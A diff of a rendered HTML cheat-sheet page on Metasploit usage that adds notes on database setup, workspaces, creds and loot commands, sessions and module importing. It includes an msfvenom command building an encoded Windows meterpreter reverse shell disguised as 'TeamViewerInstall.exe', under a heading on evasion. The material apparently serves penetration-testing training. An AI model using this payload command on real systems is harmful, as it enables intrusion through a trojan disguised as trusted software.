@@ -5,6 +5,9 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="/assets/css/style.css">
+
     <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
 
 <!-- Setup theme-color -->
@@ -45,7 +48,6 @@
   </head>
 
   <body>
-
     <header>
       <div class="container">
         <a id="a-title" href="/">
@@ -146,8 +148,67 @@ msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> show encoders
 </code></pre></div></div>
 
+<h2 id="databases">Databases</h2>
+<h3 id="initiate-the-database">Initiate the Database</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>systemctl start postgresql
+<span class="nv">$ </span><span class="nb">sudo </span>msfdb init
+<span class="nv">$ </span><span class="nb">sudo </span>msfdb run
+</code></pre></div></div>
+
+<h3 id="reinitiate-the-database">Reinitiate the Database</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfdb reinit
+<span class="nv">$ </span><span class="nb">cp</span> /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+<span class="nv">$ </span><span class="nb">sudo </span>service postgresql restart
+<span class="nv">$ </span>msfconsole <span class="nt">-q</span>
+</code></pre></div></div>
+
+<h3 id="using-the-database">Using the Database</h3>
+<h4 id="database-options">Database Options</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> <span class="nb">help </span>database
+</code></pre></div></div>
+
+<h4 id="workspaces">Workspaces</h4>
+<p>We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> workspace <span class="nt">-h</span>
+</code></pre></div></div>
+
+<h4 id="importing-scan-results">Importing Scan Results</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> db_import Target.xml
+</code></pre></div></div>
+
+<h4 id="data-backup">Data Backup</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> db_export <span class="nt">-h</span>
+</code></pre></div></div>
+
+<h4 id="hosts">Hosts</h4>
+<p>The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> hosts <span class="nt">-h</span>
+</code></pre></div></div>
+
+<h4 id="services">Services</h4>
+<p>The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> services <span class="nt">-h</span>
+</code></pre></div></div>
+
+<h4 id="credentials">Credentials</h4>
+<p>The creds command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> creds <span class="nt">-h</span>
+</code></pre></div></div>
+
+<h4 id="loot">Loot</h4>
+<p>The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> loot <span class="nt">-h</span>
+</code></pre></div></div>
+
 <h2 id="plugins">Plugins</h2>
 <p><code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/plugins</code></p>
+
+<p>If the plugin is found here, we can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> load &lt;PLUGIN&gt;
 </code></pre></div></div>
@@ -157,7 +218,9 @@ msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> 
 </code></pre></div></div>
 
 <h2 id="sessions">Sessions</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>CTRL] + <span class="o">[</span>Z]
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Background the current Session</span>
+<span class="o">[</span>CTRL] + <span class="o">[</span>Z]
+
 <span class="c"># List Active Sessions</span>
 msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> sessions
 
@@ -187,7 +250,10 @@ OPTIONS:
 <h2 id="importing-modules">Importing Modules</h2>
 <p>We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> &lt;MODULE&gt;.rb /usr/share/metasploit-framework/modules/&lt;PATH/&gt;&lt;MODULE&gt;.rb
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> &lt;our_module_here&gt;.rb /usr/share/metasploit-framework/modules/&lt;PATH/&gt;&lt;MODULE&gt;.rb
+<span class="nv">$ </span>msfconsole <span class="nt">-m</span> /usr/share/metasploit-framework/modules/
+msf6 <span class="o">&gt;</span> loadpath /usr/share/metasploit-framework/modules/
+msf6 <span class="o">&gt;</span> reload_all<span class="sb">```</span>
 </code></pre></div></div>
 
 <hr />
@@ -244,7 +310,7 @@ OPTIONS:
 </code></pre></div></div>
 
 <h3 id="multiple-iterations">Multiple Iterations</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.5 <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-i</span> 10 <span class="nt">-o</span> /root/Desktop/TeamViewerInstall.exe<span class="sb">`</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.5 <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-i</span> 10 <span class="nt">-o</span> /root/Desktop/TeamViewerInstall.exe
 </code></pre></div></div>
 
 <h2 id="evasion-techniques">Evasion Techniques</h2>
